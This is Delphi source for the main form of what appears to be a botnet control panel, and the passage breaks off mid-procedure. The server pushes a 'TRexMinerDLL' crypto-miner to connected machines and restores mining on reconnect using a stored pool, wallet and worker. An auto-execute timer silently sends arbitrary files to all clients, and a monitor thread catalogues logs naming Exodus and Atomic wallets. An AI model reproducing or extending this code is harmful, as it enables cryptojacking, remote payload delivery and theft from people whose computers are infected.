unit Main;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, scControls, scGPControls, Vcl.ExtCtrls,
  Vcl.BaseImageCollection, Vcl.ImageCollection, System.ImageList, Vcl.ImgList,
  Vcl.VirtualImageList, Vcl.Imaging.pngimage, scStyledForm, scGPExtControls,
  scGPPagers, scGPImages, Vcl.StdCtrls, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, Vcl.ComCtrls, System.Generics.Collections,
  IdHTTP, IdTCPConnection, IdTCPClient, IdURI,
  IdSSLOpenSSL, IdSSL, System.JSON, System.IOUtils, System.UITypes, Math, IdContext, IdGlobal,
  Vcl.Menus,Winapi.CommCtrl, DzSocket, UClient, Winapi.MMSystem,
  scModernControls, Vcl.Mask, System.NetEncoding, Winapi.ShellAPI;





      type
  _MARGINS = record
    cxLeftWidth: Integer;
    cxRightWidth: Integer;
    cyTopHeight: Integer;
    cyBottomHeight: Integer;
  end;


 type
 TClientMiningStatus = (cmIdle, cmStarting, cmRunning, cmStopping, cmError);

  // THEN: Use it in the persistent client info record
  TPersistentClientInfo = record
    IP: string;
    DisplayName: string;
    LastMiningStatus: TClientMiningStatus;
    LastHashrate: string;
    LastSeen: TDateTime;
    WasMining: Boolean;
    MiningPool: string;
    MiningWallet: string;
    MiningWorker: string;
    MiningIntensity: Integer;
    TotalMiningTime: Integer; // in minutes
    SessionCount: Integer;
  end;


   TClientInfo = class
  public
    Socket: TDzSocket;
    DisplayName: string;
    MiningStatus: TClientMiningStatus;
    Hashrate: string;
    LastUpdate: TDateTime;
    constructor Create(ASocket: TDzSocket; const ADisplayName: string);
  end;

type
  TFileInfo = record
    FileName: string;
    IP: string;
    Username: string;
    Exodus: string;
    Atomic: string;
    WalletExt: string;
    FileSize: Int64;
    CountryCode: string;
  end;

  TCountryInfo = record
    CountryCode: string;
    FlagIndex: Integer;
  end;

  TFileMonitorThread = class(TThread)
  private
    FLogFolder: string;
    FListView: TListView;
    FFileList: TList<TFileInfo>;
    FCountryCache: TDictionary<string, TCountryInfo>;
    FLastScanTime: TDateTime;

    procedure UpdateListView;
    function GetFlagIndex(const CountryCode: string): Integer;
    function GetCountryFromIP(const IP: string): TCountryInfo;
    function ParseFileName(const FileName: string): TFileInfo;
  protected
    procedure Execute; override;
  public
    constructor Create(AListView: TListView; const ALogFolder: string);
    destructor Destroy; override;
  end;
     const
  LVM_GETHEADER = $1000 + 31;
  HDS_OWNERDRAWNFIXED = $0100;
  HDM_GETITEM = $1200 + 11;


type
  TForm2 = class(TForm)
    scGPPanel1: TscGPPanel;
    scGPButton1: TscGPButton;
    VirtualImageList1: TVirtualImageList;
    ImageCollection1: TImageCollection;
    scGPButton2: TscGPButton;
    scGPButton4: TscGPButton;
    Image1: TImage;
    scGPPanel2: TscGPPanel;
    scGPPageControl1: TscGPPageControl;
    Connections: TscGPPageControlPage;
    Dashboard: TscGPPageControlPage;
    AutoTasks: TscGPPageControlPage;
    LocalSettings: TscGPPageControlPage;
    Settings: TscGPPageControlPage;
    AboutOcta: TscGPPageControlPage;
    scGPPanel3: TscGPPanel;
    scGPButton7: TscGPButton;
    scGPImage1: TscGPImage;
    Label1: TLabel;
    Label4: TLabel;
    Label7: TLabel;
    scGPPanel6: TscGPPanel;
    scGPPanel7: TscGPPanel;
    Label8: TLabel;
    Label9: TLabel;
    scGPPanel8: TscGPPanel;
    Label10: TLabel;
    scGPImage4: TscGPImage;
    scGPPanel9: TscGPPanel;
    ImageList1: TImageList;
    L: TscListBox;
    S: TDzTCPServer;
    StatusBar1: TStatusBar;
    EdLog: TMemo;
    scGPPanel10: TscGPPanel;
    Label11: TLabel;
    scGPPanel11: TscGPPanel;
    Label12: TLabel;
    scMemo1: TscMemo;
    scGPPanel12: TscGPPanel;
    Label13: TLabel;
    scGPPanel13: TscGPPanel;
    Label14: TLabel;
    Label15: TLabel;
    scGPImage5: TscGPImage;
    scGPPanel14: TscGPPanel;
    Label16: TLabel;
    scGPImage6: TscGPImage;
    scGPPanel15: TscGPPanel;
    Label18: TLabel;
    scGPImage7: TscGPImage;
    scGPPanel16: TscGPPanel;
    Label17: TLabel;
    scGPImage8: TscGPImage;
    scGPSwitch1: TscGPSwitch;
    scEdit1: TscEdit;
    scEdit2: TscEdit;
    Label19: TLabel;
    Label20: TLabel;
    scGPButton9: TscGPButton;
    scEdit3: TscEdit;
    Label21: TLabel;
    scGPButton10: TscGPButton;
    scGPButton11: TscGPButton;
    Label22: TLabel;
    Label23: TLabel;
    scGPSwitch2: TscGPSwitch;
    Label24: TLabel;
    scGPSwitch3: TscGPSwitch;
    scGPComboBox1: TscGPComboBox;
    mytimeanddate: TTimer;
    scGPButton5: TscGPButton;
    scGPButton8: TscGPButton;
    Image2: TImage;
    scGPPanel17: TscGPPanel;
    scMemo2: TscMemo;
    Label25: TLabel;
    scGPPanel18: TscGPPanel;
    Label26: TLabel;
    scGPPanel19: TscGPPanel;
    Label27: TLabel;
    scGPImage9: TscGPImage;
    scGPPanel20: TscGPPanel;
    scGPButton6: TscGPButton;
    scGPSwitch4: TscGPSwitch;
    Label28: TLabel;
    scGPPanel21: TscGPPanel;
    Label29: TLabel;
    scGPButton12: TscGPButton;
    scGPPanel22: TscGPPanel;
    scGPButton13: TscGPButton;
    scEdit4: TscEdit;
    autoexec: TTimer;
    Label30: TLabel;
    Label31: TLabel;
    Label32: TLabel;
    Label33: TLabel;
    scGPButton14: TscGPButton;
    PersistentTimer: TTimer;
    Label2: TLabel;
    procedure FormCreate(Sender: TObject);

    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure scGPButton2Click(Sender: TObject);
    procedure SClientDisconnect(Sender: TObject; Socket: TDzSocket);
    procedure SClientError(Sender: TObject; Socket: TDzSocket;
      const Event: TErrorEvent; const ErrorCode: Integer;
      const ErrorMsg: string);
    procedure SClientLoginCheck(Sender: TObject; Socket: TDzSocket;
      var Accept: Boolean; const RequestData: string; var ResponseData: string);
    procedure SClientLoginSuccess(Sender: TObject; Socket: TDzSocket);
    procedure SClientRead(Sender: TObject; Socket: TDzSocket; const Cmd: Char;
      const A: string);
    procedure scGPButton1Click(Sender: TObject);
    procedure scGPButton4Click(Sender: TObject);
    procedure scGPButton10Click(Sender: TObject);
    procedure scGPButton11Click(Sender: TObject);
    procedure mytimeanddateTimer(Sender: TObject);
    procedure scGPButton7Click(Sender: TObject);
    procedure scGPButton5Click(Sender: TObject);
    procedure scGPButton9Click(Sender: TObject);
    procedure scGPButton8Click(Sender: TObject);
    procedure LDblClick(Sender: TObject);
    procedure scGPButton6Click(Sender: TObject);
    procedure scGPSwitch4ChangeState(Sender: TObject);
    procedure scGPButton13Click(Sender: TObject);
    procedure autoexecTimer(Sender: TObject);
    procedure scGPButton12Click(Sender: TObject);
    procedure LDrawItem(AIndex: Integer; AState: TOwnerDrawState;
      ACanvas: TCanvas; ARect: TRect);
    procedure FormDestroy(Sender: TObject);
    procedure PersistentTimerTimer(Sender: TObject);


  private
    { Private declarations }
    FMonitorThread: TFileMonitorThread;
    ListViewWindow: HWND;
    FClientList: TList<TClientInfo>;
    FPersistentClients: TDictionary<string, TPersistentClientInfo>;
    FStateFileName: string;

    procedure StartMonitoring;
    procedure SetupListView;
    procedure Log(const Text: string);
    function NickNameAlreadyExists(const NickName: string): Boolean;
    procedure NotificationFormClose(Sender: TObject; var Action: TCloseAction);

  public
    procedure WMNCHitTest(var Msg: TWMNCHitTest); message WM_NCHITTEST;
    procedure SendMiningDLLToClient(Socket: TDzSocket);
    procedure SendMiningDLL;
    procedure SetClientMiningStatus(Socket: TDzSocket; const StatusStr: string);
    procedure UpdateClientMiningStatus(Socket: TDzSocket; Status: TClientMiningStatus; const Hashrate: string = '');
    function FindClientInfo(Socket: TDzSocket): TClientInfo;
    procedure RefreshClientListDisplay;
    procedure SaveClientState;
    procedure LoadClientState;
    function ExtractClientIP(const NickName: string): string;
    function GetPersistentClient(const IP: string): TPersistentClientInfo;
    procedure UpdatePersistentClient(const IP: string; const ClientInfo: TPersistentClientInfo);
    procedure RestoreClientMiningState(Socket: TDzSocket; const IP: string);
  end;

var
  Form2: TForm2;

implementation

{$R *.dfm}
uses
  Winapi.Dwmapi,  Winapi.UxTheme, notification,Unit5;


var
  ActiveNotifications: Integer = 0;


  procedure TForm2.RefreshClientListDisplay;
begin
  L.Invalidate;
end;

  constructor TClientInfo.Create(ASocket: TDzSocket; const ADisplayName: string);
begin
  inherited Create;
  Socket := ASocket;
  DisplayName := ADisplayName;
  MiningStatus := cmIdle;
  Hashrate := '0.00 MH/s';
  LastUpdate := Now;
end;

procedure TForm2.autoexecTimer(Sender: TObject);
var
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;
begin

   if scEdit4.Text = '' then Exit;

  FileName := ExtractFileName(scEdit4.Text);

  try
    FileStream := TFileStream.Create(scEdit4.Text, fmOpenRead);
    try
      if FileStream.Size > 50 * 1024 * 1024 then // 50 MB limit
      begin
        Exit;
      end;

      SetLength(ByteArray, FileStream.Size);
      FileStream.ReadBuffer(ByteArray[0], FileStream.Size);

      Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);

      S.SendAll('U', FileName + '|' + Base64Str);

    finally
      FileStream.Free;
    end;
  except
    on E: Exception do
      // Silent exception handling
  end;
end;

procedure TForm2.FormCreate(Sender: TObject);
var
  Shadow: Integer;
  Margins: Winapi.UxTheme._MARGINS;
const
  DWMWCP_ROUND = 2;
  DWMWA_WINDOW_CORNER_PREFERENCE = 33;
  var
  ComputerName: string;
  Size: DWORD;
begin


     FPersistentClients := TDictionary<string, TPersistentClientInfo>.Create;
  FStateFileName := ExtractFilePath(Application.ExeName) + 'ClientStates.dat';

  // Load previous client states
  LoadClientState;

 FClientList := TList<TClientInfo>.Create;


  PersistentTimer := TTimer.Create(Self);
  PersistentTimer.Interval := 30000; // Save every 30 seconds
  PersistentTimer.OnTimer := PersistentTimerTimer;
  PersistentTimer.Enabled := True;

  L.ItemHeight := 24; // Make items taller to fit icon
  L.OnDrawItem := LDrawItem; // We'll create this event


     scGPPageControl1.TabIndex := 1;
        SetLength(ComputerName, MAX_COMPUTERNAME_LENGTH + 1);
  Size := MAX_COMPUTERNAME_LENGTH + 1;


  if GetComputerName(PChar(ComputerName), Size) then
  begin
    SetLength(ComputerName, Size);
    Label7.Caption := 'Welcome ' + ComputerName + '';
  end
  else
    Label7.Caption := 'Welcome Unknown';




   scGPComboBox1.ItemIndex := 0;
 

SetupListView;
    StartMonitoring;

   BorderStyle := bsNone;


  Shadow := 1;
  DwmSetWindowAttribute(Handle, DWMWA_NCRENDERING_POLICY, @Shadow, SizeOf(Shadow));


  Margins.cxLeftWidth := 2;
  Margins.cxRightWidth := 2;
  Margins.cyTopHeight := 2;
  Margins.cyBottomHeight := 2;
  DwmExtendFrameIntoClientArea(Handle, Margins);


  SetWindowLong(Handle, GWL_EXSTYLE,
    GetWindowLong(Handle, GWL_EXSTYLE) or WS_EX_LAYERED);



end;


function TForm2.ExtractClientIP(const NickName: string): string;
var
  Parts: TArray<string>;
begin
  Result := '';
  Parts := NickName.Split(['|']);
  if Length(Parts) > 0 then
    Result := Trim(Parts[0]);
end;

// Get persistent client info
function TForm2.GetPersistentClient(const IP: string): TPersistentClientInfo;
begin
  if not FPersistentClients.TryGetValue(IP, Result) then
  begin
    // Initialize new client record
    Result.IP := IP;
    Result.DisplayName := '';
    Result.LastMiningStatus := cmIdle;
    Result.LastHashrate := '0.00 MH/s';
    Result.LastSeen := Now;
    Result.WasMining := False;
    Result.MiningPool := '';
    Result.MiningWallet := '';
    Result.MiningWorker := '';
    Result.MiningIntensity := 20;
    Result.TotalMiningTime := 0;
    Result.SessionCount := 0;
  end;
end;

// Update persistent client info
procedure TForm2.UpdatePersistentClient(const IP: string; const ClientInfo: TPersistentClientInfo);
begin
  FPersistentClients.AddOrSetValue(IP, ClientInfo);
end;


procedure TForm2.RestoreClientMiningState(Socket: TDzSocket; const IP: string);
var
  PersistentInfo: TPersistentClientInfo;
  MiningCommand: string;
begin
  PersistentInfo := GetPersistentClient(IP);

  if PersistentInfo.WasMining and (PersistentInfo.MiningPool <> '') then
  begin
    Log(Format('Restoring mining state for %s - Pool: %s', [IP, PersistentInfo.MiningPool]));

    // Send restore mining command
    MiningCommand := Format('%s|%s|%s|%d', [
      PersistentInfo.MiningPool,
      PersistentInfo.MiningWallet,
      PersistentInfo.MiningWorker,
      PersistentInfo.MiningIntensity
    ]);

    try
      Socket.Send('S', MiningCommand);
      Log(Format('Mining restoration command sent to %s', [IP]));
    except
      on E: Exception do
        Log(Format('Failed to restore mining for %s: %s', [IP, E.Message]));
    end;
  end;
end;


procedure TForm2.SaveClientState;
var
  FileStream: TFileStream;
  ClientPair: TPair<string, TPersistentClientInfo>;
  Count: Integer;
  ClientInfo: TPersistentClientInfo;
begin
  try
    FileStream := TFileStream.Create(FStateFileName, fmCreate);
    try
      Count := FPersistentClients.Count;
      FileStream.WriteBuffer(Count, SizeOf(Count));

      for ClientPair in FPersistentClients do
      begin
        ClientInfo := ClientPair.Value;
        // Write IP length and IP
        Count := Length(ClientInfo.IP);
        FileStream.WriteBuffer(Count, SizeOf(Count));
        if Count > 0 then
          FileStream.WriteBuffer(ClientInfo.IP[1], Count * SizeOf(Char));

        // Write DisplayName length and DisplayName
        Count := Length(ClientInfo.DisplayName);
        FileStream.WriteBuffer(Count, SizeOf(Count));
        if Count > 0 then
          FileStream.WriteBuffer(ClientInfo.DisplayName[1], Count * SizeOf(Char));

        // Write other fields
        FileStream.WriteBuffer(ClientInfo.LastMiningStatus, SizeOf(ClientInfo.LastMiningStatus));

        // Write LastHashrate
        Count := Length(ClientInfo.LastHashrate);
        FileStream.WriteBuffer(Count, SizeOf(Count));
        if Count > 0 then
          FileStream.WriteBuffer(ClientInfo.LastHashrate[1], Count * SizeOf(Char));

        FileStream.WriteBuffer(ClientInfo.LastSeen, SizeOf(ClientInfo.LastSeen));
        FileStream.WriteBuffer(ClientInfo.WasMining, SizeOf(ClientInfo.WasMining));

        // Write mining parameters
        Count := Length(ClientInfo.MiningPool);
        FileStream.WriteBuffer(Count, SizeOf(Count));
        if Count > 0 then
          FileStream.WriteBuffer(ClientInfo.MiningPool[1], Count * SizeOf(Char));

        Count := Length(ClientInfo.MiningWallet);
        FileStream.WriteBuffer(Count, SizeOf(Count));
        if Count > 0 then
          FileStream.WriteBuffer(ClientInfo.MiningWallet[1], Count * SizeOf(Char));

        Count := Length(ClientInfo.MiningWorker);
        FileStream.WriteBuffer(Count, SizeOf(Count));
        if Count > 0 then
          FileStream.WriteBuffer(ClientInfo.MiningWorker[1], Count * SizeOf(Char));

        FileStream.WriteBuffer(ClientInfo.MiningIntensity, SizeOf(ClientInfo.MiningIntensity));
        FileStream.WriteBuffer(ClientInfo.TotalMiningTime, SizeOf(ClientInfo.TotalMiningTime));
        FileStream.WriteBuffer(ClientInfo.SessionCount, SizeOf(ClientInfo.SessionCount));
      end;

      Log(Format('Saved state for %d clients', [FPersistentClients.Count]));
    finally
      FileStream.Free;
    end;
  except
    on E: Exception do
      Log('Error saving client state: ' + E.Message);
  end;
end;

// Load client states from file
procedure TForm2.LoadClientState;
var
  FileStream: TFileStream;
  Count, StrLen: Integer;
  i: Integer;
  ClientInfo: TPersistentClientInfo;
  TempStr: string;
begin
  if not FileExists(FStateFileName) then
  begin
    Log('No previous client state file found');
    Exit;
  end;

  try
    FileStream := TFileStream.Create(FStateFileName, fmOpenRead);
    try
      FileStream.ReadBuffer(Count, SizeOf(Count));

      for i := 0 to Count - 1 do
      begin
        // Read IP
        FileStream.ReadBuffer(StrLen, SizeOf(StrLen));
        SetLength(TempStr, StrLen);
        if StrLen > 0 then
          FileStream.ReadBuffer(TempStr[1], StrLen * SizeOf(Char));
        ClientInfo.IP := TempStr;

        // Read DisplayName
        FileStream.ReadBuffer(StrLen, SizeOf(StrLen));
        SetLength(TempStr, StrLen);
        if StrLen > 0 then
          FileStream.ReadBuffer(TempStr[1], StrLen * SizeOf(Char));
        ClientInfo.DisplayName := TempStr;

        // Read other fields
        FileStream.ReadBuffer(ClientInfo.LastMiningStatus, SizeOf(ClientInfo.LastMiningStatus));

        // Read LastHashrate
        FileStream.ReadBuffer(StrLen, SizeOf(StrLen));
        SetLength(TempStr, StrLen);
        if StrLen > 0 then
          FileStream.ReadBuffer(TempStr[1], StrLen * SizeOf(Char));
        ClientInfo.LastHashrate := TempStr;

        FileStream.ReadBuffer(ClientInfo.LastSeen, SizeOf(ClientInfo.LastSeen));
        FileStream.ReadBuffer(ClientInfo.WasMining, SizeOf(ClientInfo.WasMining));

        // Read mining parameters
        FileStream.ReadBuffer(StrLen, SizeOf(StrLen));
        SetLength(TempStr, StrLen);
        if StrLen > 0 then
          FileStream.ReadBuffer(TempStr[1], StrLen * SizeOf(Char));
        ClientInfo.MiningPool := TempStr;

        FileStream.ReadBuffer(StrLen, SizeOf(StrLen));
        SetLength(TempStr, StrLen);
        if StrLen > 0 then
          FileStream.ReadBuffer(TempStr[1], StrLen * SizeOf(Char));
        ClientInfo.MiningWallet := TempStr;

        FileStream.ReadBuffer(StrLen, SizeOf(StrLen));
        SetLength(TempStr, StrLen);
        if StrLen > 0 then
          FileStream.ReadBuffer(TempStr[1], StrLen * SizeOf(Char));
        ClientInfo.MiningWorker := TempStr;

        FileStream.ReadBuffer(ClientInfo.MiningIntensity, SizeOf(ClientInfo.MiningIntensity));
        FileStream.ReadBuffer(ClientInfo.TotalMiningTime, SizeOf(ClientInfo.TotalMiningTime));
        FileStream.ReadBuffer(ClientInfo.SessionCount, SizeOf(ClientInfo.SessionCount));

        FPersistentClients.Add(ClientInfo.IP, ClientInfo);
      end;

      Log(Format('Loaded state for %d clients', [FPersistentClients.Count]));
    finally
      FileStream.Free;
    end;
  except
    on E: Exception do
      Log('Error loading client state: ' + E.Message);
  end;
end;

procedure TForm2.FormDestroy(Sender: TObject);
var
  i: Integer;
begin

    try
    // Save client states before closing
    SaveClientState;

    // Cleanup
    if Assigned(FPersistentClients) then
      FPersistentClients.Free;

    if Assigned(PersistentTimer) then
    begin
      PersistentTimer.Enabled := False;
      PersistentTimer.Free;
    end;

    // ... existing cleanup code ...
  except
    // Silent cleanup
  end;


  try
    // Just close the server - DzSocket handles checking if it's open
    S.Close;

    // Free client list
    if Assigned(FClientList) then
    begin
      for i := FClientList.Count - 1 downto 0 do
      begin
        if Assigned(FClientList[i]) then
          FClientList[i].Free;
      end;
      FClientList.Free;
      FClientList := nil;
    end;

    // Stop monitoring thread
    if Assigned(FMonitorThread) then
    begin
      FMonitorThread.Terminate;
      FMonitorThread := nil;
    end;
  except
    // Silent cleanup
  end;
end;

procedure TForm2.SClientDisconnect(Sender: TObject; Socket: TDzSocket);
var
  C: TClient;
  Idx: Integer;
  ClientInfo: TClientInfo;
  i: Integer;
begin
  if not Socket.Auth then Exit;

  try
    C := Socket.Data;
    if Assigned(C) then
    begin
      Log(Format('%s disconnected', [C.NickName]));

      // Free the client object
      C.Free;
      Socket.Data := nil;
    end;

    Idx := L.Items.IndexOfObject(Socket);
    if Idx <> -1 then
      L.Items.Delete(Idx);

    // Remove from tracking list and free memory
    for i := FClientList.Count - 1 downto 0 do
    begin
      if FClientList[i].Socket = Socket then
      begin
        ClientInfo := FClientList[i];
        FClientList.Delete(i);
        ClientInfo.Free; // Free the client info object
        Break;
      end;
    end;

    StatusBar1.Panels[0].Text := Format('Clients: %d', [L.Items.Count]);
    Label4.Caption := Format('%d', [L.Items.Count]);
  except
    on E: Exception do
      Log('Error in client disconnect: ' + E.Message);
  end;
end;

procedure TForm2.SClientError(Sender: TObject; Socket: TDzSocket;
  const Event: TErrorEvent; const ErrorCode: Integer; const ErrorMsg: string);
begin
 Log(Format('Client socket error (ID %d): %s', [Socket.ID, ErrorMsg]));
end;

procedure TForm2.SClientLoginCheck(Sender: TObject; Socket: TDzSocket;
  var Accept: Boolean; const RequestData: string; var ResponseData: string);
   var
  NickName: string;
  C: TClient;
begin
  NickName := RequestData;
  if NickNameAlreadyExists(NickName) then
  begin
    Accept := False;
    ResponseData := 'Another user is already connected with the same nick name';
    Exit;
  end;


  C := TClient.Create;
  C.NickName := NickName;

  Socket.Data := C;
end;
  function TForm2.NickNameAlreadyExists(const NickName: string): Boolean;
var
  Socket: TDzSocket;
  C: TClient;
begin
  for Socket in S do
  begin
    C := Socket.Data;
    if SameText(C.NickName, NickName) then Exit(True);
  end;

  Exit(False);
end;

procedure TForm2.SClientLoginSuccess(Sender: TObject; Socket: TDzSocket);
const
  MAX_NOTIFICATIONS = 5;
var
  C: TClient;
  FullNickName: string;
  DisplayName: string;
  ClientInfo: TClientInfo;
  ClientIP: string;
  PersistentInfo: TPersistentClientInfo;
  StatusText: string;  // ADD THIS VARIABLE
begin
  C := Socket.Data;
  FullNickName := C.NickName;
  DisplayName := StringReplace(FullNickName, '|', ' ', [rfReplaceAll]);
  ClientIP := ExtractClientIP(FullNickName);
  Log(Format('%s connected (IP: %s)', [DisplayName, ClientIP]));

  // Get persistent client info
  PersistentInfo := GetPersistentClient(ClientIP);
  PersistentInfo.DisplayName := DisplayName;
  PersistentInfo.LastSeen := Now;
  PersistentInfo.SessionCount := PersistentInfo.SessionCount + 1;

  // Show reconnection info if client was mining before
  if PersistentInfo.WasMining then
  begin
    // REPLACE THE GetEnumName LINE WITH THIS:
    case PersistentInfo.LastMiningStatus of
      cmIdle: StatusText := 'IDLE';
      cmStarting: StatusText := 'STARTING';
      cmRunning: StatusText := 'RUNNING';
      cmStopping: StatusText := 'STOPPING';
      cmError: StatusText := 'ERROR';
    else
      StatusText := 'UNKNOWN';
    end;

    Log(Format('Client %s was previously mining - Status: %s, Sessions: %d',
      [DisplayName, StatusText, PersistentInfo.SessionCount]));
  end;

  // Update persistent storage
  UpdatePersistentClient(ClientIP, PersistentInfo);

  // Existing notification code
  if (scGPSwitch1.State = TscSwitchState.scswOn) and (ActiveNotifications < MAX_NOTIFICATIONS) then
  begin
    Inc(ActiveNotifications);
    Form3 := TForm3.Create(Application);

    // Enhanced notification with reconnection info
    if PersistentInfo.SessionCount > 1 then
      Form3.Caption := Format('%s reconnected (Session #%d)', [DisplayName, PersistentInfo.SessionCount])
    else
      Form3.Caption := Format('%s connected', [DisplayName]);

    Form3.Label1.Caption := Format('%s', [DisplayName]);
    Form3.OnClose := NotificationFormClose;
    Form3.Show;

    if ActiveNotifications = 1 then
      PlaySound(PChar('notify.wav'), 0, SND_ASYNC or SND_FILENAME);

    Form3.TimerFadeOut.Tag := 255;
    Form3.TimerFadeOut.Interval := 100;
    Form3.TimerFadeOut.Enabled := True;
  end;

  L.Items.AddObject(DisplayName, Socket);

  // Add client to tracking list with restored state
  ClientInfo := TClientInfo.Create(Socket, DisplayName);
  ClientInfo.MiningStatus := PersistentInfo.LastMiningStatus;
  ClientInfo.Hashrate := PersistentInfo.LastHashrate;
  FClientList.Add(ClientInfo);

  Label4.Caption := Format('Clients: %d', [L.Items.Count]);

  // Restore mining state if client was mining
  if PersistentInfo.WasMining and (PersistentInfo.LastMiningStatus in [cmRunning, cmStarting]) then
  begin
    RestoreClientMiningState(Socket, ClientIP);
  end;
end;

  procedure TForm2.NotificationFormClose(Sender: TObject; var Action: TCloseAction);
begin
  Dec(ActiveNotifications);
  Action := caFree;
end;

   procedure TForm2.PersistentTimerTimer(Sender: TObject);
begin
  SaveClientState;
end;

procedure TForm2.Log(const Text: string);
begin
  EdLog.Lines.Add(FormatDateTime('hh:nn:ss', Now)+' - '+Text);
end;


procedure TForm2.SendMiningDLL;
var
  DLLPath: string;
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;
begin

  DLLPath := ExtractFilePath(Application.ExeName) + 'TRexMinerDLL.dll';

  if not FileExists(DLLPath) then
  begin
    MessageBox(Handle, 'TRexMinerDLL.dll not found in application directory.',
               'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  FileName := 'TRexMinerDLL.dll';

  try
    FileStream := TFileStream.Create(DLLPath, fmOpenRead);
    try
      if FileStream.Size > 50 * 1024 * 1024 then
      begin
        MessageBox(Handle, 'DLL file is too large. Maximum size is 50 MB.',
                   'Error', MB_ICONERROR or MB_OK);
        Exit;
      end;

      SetLength(ByteArray, FileStream.Size);
      FileStream.ReadBuffer(ByteArray[0], FileStream.Size);
      Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);


      S.SendAll('U', FileName + '|' + Base64Str);

      MessageBox(Handle, PChar('Mining DLL sent to all clients (' + IntToStr(L.Items.Count) + ').'),
                 'Success', MB_ICONINFORMATION or MB_OK);
    finally
      FileStream.Free;
    end;
  except
    on E: Exception do
      MessageBox(Handle, PChar('Error sending DLL: ' + E.Message),
                 'Error', MB_ICONERROR or MB_OK);
  end;
end;

procedure TForm2.SendMiningDLLToClient(Socket: TDzSocket);
var
  DLLPath: string;
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;
begin
  if (Socket = nil) or (not Socket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  DLLPath := ExtractFilePath(Application.ExeName) + 'TRexMinerDLL.dll';

  if not FileExists(DLLPath) then
  begin
    MessageBox(Handle, 'TRexMinerDLL.dll not found in application directory.',
               'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  FileName := 'TRexMinerDLL.dll';

  try
    FileStream := TFileStream.Create(DLLPath, fmOpenRead);
    try
      SetLength(ByteArray, FileStream.Size);
      FileStream.ReadBuffer(ByteArray[0], FileStream.Size);
      Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);

      Socket.Send('U', FileName + '|' + Base64Str);

      MessageBox(Handle, PChar('Mining DLL sent to client.'),
                 'Success', MB_ICONINFORMATION or MB_OK);
    finally
      FileStream.Free;
    end;
  except
    on E: Exception do
      MessageBox(Handle, PChar('Error sending DLL: ' + E.Message),
                 'Error', MB_ICONERROR or MB_OK);
  end;
end;
procedure TForm2.SClientRead(Sender: TObject; Socket: TDzSocket; const Cmd: Char; const A: string);
var
  C: TClient;
  StatusParts: TArray<string>;
  Hashrate: string;
  ClientIP: string;              // MISSING VARIABLE
  PersistentInfo: TPersistentClientInfo;  // MISSING VARIABLE
  MiningParams: TArray<string>;  // MISSING VARIABLE
begin
  try
    C := Socket.Data;
    if not Assigned(C) then
    begin
      Log('Received data from unauthenticated client');
      Exit;
    end;

    ClientIP := ExtractClientIP(C.NickName);  // NOW WE CAN USE THIS
    Log(Format('[%s] Command: %s, Data: %s', [C.NickName, Cmd, Copy(A, 1, 100)]));

    case Cmd of
      'M':
      begin
        try
          S.SendAll('M', ArrayToData([C.NickName, A]));
        except
          on E: Exception do
            Log('Error broadcasting message: ' + E.Message);
        end;
      end;

      'B':
      begin
        if Assigned(RunExecute) and (RunExecute.CurrentSocket = Socket) then
          RunExecute.Label1.Caption := A;
      end;

      'S':
      begin
        // Client confirms start command - save mining parameters
        Log(Format('%s: Mining start command processed', [C.NickName]));

        // Parse and save mining parameters
        MiningParams := A.Split(['|']);
        if Length(MiningParams) >= 4 then
        begin
          PersistentInfo := GetPersistentClient(ClientIP);
          PersistentInfo.WasMining := True;
          PersistentInfo.MiningPool := MiningParams[0];
          PersistentInfo.MiningWallet := MiningParams[1];
          PersistentInfo.MiningWorker := MiningParams[2];
          PersistentInfo.MiningIntensity := StrToIntDef(MiningParams[3], 20);
          PersistentInfo.LastMiningStatus := cmStarting;
          PersistentInfo.LastSeen := Now;
          UpdatePersistentClient(ClientIP, PersistentInfo);
        end;

        SetClientMiningStatus(Socket, 'STARTING');
        if Assigned(RunExecute) and (RunExecute.CurrentSocket = Socket) then
          RunExecute.LabelStatus.Caption := 'Status: STARTING...';
      end;

      'T':
      begin
        // Client confirms stop command
        Log(Format('%s: Mining stop command processed', [C.NickName]));

        // Update persistent state
        PersistentInfo := GetPersistentClient(ClientIP);
        PersistentInfo.WasMining := False;
        PersistentInfo.LastMiningStatus := cmStopping;
        PersistentInfo.LastSeen := Now;
        UpdatePersistentClient(ClientIP, PersistentInfo);

        SetClientMiningStatus(Socket, 'STOPPING');
        if Assigned(RunExecute) and (RunExecute.CurrentSocket = Socket) then
          RunExecute.LabelStatus.Caption := 'Status: STOPPING...';
      end;

      'N':
      begin
        try
          StatusParts := A.Split(['|']);
          if Length(StatusParts) > 0 then
          begin
            // Update persistent state with current status
            PersistentInfo := GetPersistentClient(ClientIP);

            if StatusParts[0] = 'IDLE' then
            begin
              PersistentInfo.LastMiningStatus := cmIdle;
              PersistentInfo.WasMining := False;
              PersistentInfo.LastHashrate := '0.00 MH/s';
            end
            else if StatusParts[0] = 'STARTING' then
            begin
              PersistentInfo.LastMiningStatus := cmStarting;
              PersistentInfo.WasMining := True;
            end
            else if StatusParts[0] = 'RUNNING' then
            begin
              PersistentInfo.LastMiningStatus := cmRunning;
              PersistentInfo.WasMining := True;
              if Length(StatusParts) > 1 then
                PersistentInfo.LastHashrate := StatusParts[1] + ' MH/s';
            end
            else if StatusParts[0] = 'STOPPING' then
            begin
              PersistentInfo.LastMiningStatus := cmStopping;
            end
            else if StatusParts[0] = 'ERROR' then
            begin
              PersistentInfo.LastMiningStatus := cmError;
              PersistentInfo.WasMining := False;
            end;

            PersistentInfo.LastSeen := Now;
            UpdatePersistentClient(ClientIP, PersistentInfo);

            // Update UI and current tracking
            SetClientMiningStatus(Socket, A);

